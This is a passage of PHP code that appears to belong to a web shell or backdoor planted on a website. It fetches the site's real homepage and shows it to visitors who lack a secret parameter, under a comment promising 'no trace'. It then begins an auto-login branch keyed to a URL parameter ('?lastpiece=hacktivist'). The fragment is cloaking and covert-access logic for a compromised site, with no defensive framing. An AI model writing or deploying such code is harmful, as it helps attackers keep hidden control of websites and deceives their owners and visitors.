@file_get_contents($homeUrl, false, $ctx);
    if ($homepage !== false && strlen($homepage) > 100) return $homepage;
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $homeUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $homepage = curl_exec($ch);
        curl_close($ch);
        if ($homepage !== false && strlen($homepage) > 100) return $homepage;
    }
    
    return null;
}

// === GATE: No param = show real homepage, no trace ===
if (!isAuthenticated()) {
    if (!$SECRET_PARAM) {
        $homepage = fetchHomepage();
        if ($homepage !== null) {
            echo $homepage;
            exit;
        }
        header('Location: /');
        exit;
    }
    
    // Auto-login via URL: ?lastpiece=hacktivist&pa